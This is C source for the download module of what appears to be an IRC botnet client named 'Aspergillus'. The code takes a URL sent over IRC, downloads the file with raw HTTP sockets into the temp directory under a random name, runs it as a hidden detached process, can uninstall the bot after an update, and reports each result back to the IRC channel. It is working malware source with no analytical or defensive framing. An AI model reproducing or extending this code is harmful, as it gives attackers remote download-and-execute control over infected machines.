/*
		Aspergillus V1.3 by D
		Copyright (c) 2007
*/

#include "shared.h"


/////////////////
// config here //
/////////////////

char cfg_useragent[] = "Mozilla/5.0";

// not encoded strings
static char string_dlerror[] = "Error:";
static char string_downloaded[] = "Downloaded:";
static char string_nostart[] = "Failed to run file:";
static char string_running[] = "File running:";
static char string_removing[] = "File running, now removing...";
static char string_unknown[] = "Unknown error.";

/////////////////
// config ends //
/////////////////


int DL_GetFile(SOCKET sock, char *destination)
{
	FILE	*f;
	char	buff[2] = {0};
	int		i, len = 0;


	f = fopen(destination, "wb");
	if (f == NULL)
		return -8;

	while ((i = recv(sock, buff, 1, 0)) > 0)
	{
		fwrite(buff, 1, 1, f);
		buff[0] = 0;
		len += i;
	}

	fclose(f);

	return len;	
}


int DL_ProcessHTTP(SOCKET sock, char *destination)
{
	char		buffer[1024];
	int			len = 0;

	while ((len += recv(sock, buffer + len, 1, 0)) > 0)
	{
		if (strstr(buffer, "\r\n\r\n") != NULL)
			return DL_GetFile(sock, destination);
		else if (len == 1024)
			break;
	}
	
	return -7;
}


int DL_HTTP(char *host, char *file, char *destination)
{
	char				buffer[MAX_LINE];
	unsigned int		resv_host;
	struct sockaddr_in	address;
	SOCKET				sock;
	int					fsize;

	_snprintf(buffer, sizeof(buffer) - 1, "GET /%s HTTP/1.1\r\n"
										  "Host: %s\r\n"
									  	  "User-Agent: %s\r\n"
										  "Keep-Alive: 300\r\n"
										  "Connection: keep-alive\r\n\r\n", 
										  file, host, cfg_useragent);

	resv_host = Resolve(host);
	if (resv_host == 0)
		return -4;

	address.sin_addr.s_addr = resv_host;
	address.sin_family = AF_INET;
	address.sin_port = htons(80);

	if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
		return -5;

	if (connect(sock, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
		return -6;

	send(sock, buffer, strlen(buffer), 0);

	_snprintf(destination, sizeof(destination) - 1, "C:\\a.zip");

	fsize = DL_ProcessHTTP(sock, destination);

	closesocket(sock);

	return fsize;
}


int DL_Main(char *url, char *destination)
{
	char	host[128],
			file[128],
			*pch;

	// check if its http or ftp protocol
	// ftp not supported yet!
	pch = strtok(url, "/");
	if (strcmp(pch, "http:"))
		return -1;

	pch = strtok(NULL, "/");
	if (pch == NULL)
		return -2;
	else
		_snprintf(host, sizeof(host) - 1, "%s", pch);

	pch = strtok(NULL, "");
	if (pch == NULL)
		return -3;
	else
		_snprintf(file, sizeof(file) - 1, "%s", pch);

	return DL_HTTP(host, file, destination);
}


int DL_RunOrRemove(char *destination, int mode)
{
	PROCESS_INFORMATION		p;
	STARTUPINFO				s;

	memset(&p, 0, sizeof(p));
	memset(&s, 0, sizeof(s));
	s.lpTitle = "";
	s.cb = sizeof(s);
	s.dwFlags = STARTF_USESHOWWINDOW;
	s.wShowWindow = SW_HIDE;

	if (!CreateProcess(NULL, destination, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &s, &p)) 
		return 0;

	CloseHandle(p.hProcess);
	CloseHandle(p.hThread);

	if (mode == 2)
	{
		SC_StopOrUninstall(TRUE);
		return 2;
	}
	else
		return 1;
}


DWORD WINAPI DL_Thread(LPVOID param)
{
	int					ret, e = 0;
	char				buffer[MAX_LINE];
	download_s			dl = *((download_s *)param);

	// fix destination
	if (dl.destination[0] == 0)
	{
		char	temp[MAX_PATH], *pch;

		GetTempPath(sizeof(temp), temp);
		pch = strrchr(dl.url, '.');
		if (pch != NULL)
			_snprintf(dl.destination, sizeof(dl.destination) - 1, "%s%s%s", temp, GenerateRandomLetters(2), pch);
		else
			_snprintf(dl.destination, sizeof(dl.destination) - 1, "%s%s.exe", temp, GenerateRandomLetters(2));
	}

	// dont need these (only for debugging)
	_snprintf(buffer, sizeof(buffer) - 1, "Downloading: %s to: %s", dl.url, dl.destination);
	IRC_Send(dl.ircsock, MSG_PRIVMSG, buffer, dl.channel);
	memset(buffer, 0, sizeof(buffer));


	ret = DL_Main(dl.url, dl.destination);

	if (ret <= 0)
		_snprintf(buffer, sizeof(buffer) - 1, "%s (%d).", string_dlerror, ret);

	else
	{
		if (dl.mode == 1 || dl.mode == 2)
		{
			e = DL_RunOrRemove(dl.destination, dl.mode);
			switch (e)
			{
			case 0:
				_snprintf(buffer, sizeof(buffer) - 1, "%s %d KB.", string_nostart, ret/1024);
				break;
			case 1:
				_snprintf(buffer, sizeof(buffer) - 1, "%s %d KB.", string_running, ret/1024);
				break;
			case 2:
				_snprintf(buffer, sizeof(buffer) - 1, "%s", string_removing);
				break;
			default:
				_snprintf(buffer, sizeof(buffer) - 1, "Unknown error.");
				break;
			}
		}
		else
			_snprintf(buffer, sizeof(buffer) - 1, "%s %d kB.", string_downloaded, ret/1024);
	}

	IRC_Send(dl.ircsock, MSG_PRIVMSG, buffer, dl.channel);
	memset(buffer, 0, sizeof(buffer));

/*
static char string_protnotsup[] = "Protocol not supported, use http only!";
static char string_nohost[] = "Couldn't get host out of URL!";
static char string_nofile[] = "Couldn't get file out of URL!";
static char string_noresolve[] = "Couldn't resolve host!";
static char string_nosocket[] = "Failed to initialize socket!";
static char string_noconnect[] = "Couldn't connect to host!";
static char string_bufferover[] = "Max buffer size reached!";
static char string_nolocalfile[] = "Failed to open local file!";
static char string_failed[] = "Failed to download file!";
*/
	if (e == 2)
	{
		WSACleanup();
		ExitProcess(0);
	}

	Thread_Clear(dl.tnum);
	ExitThread(0);
}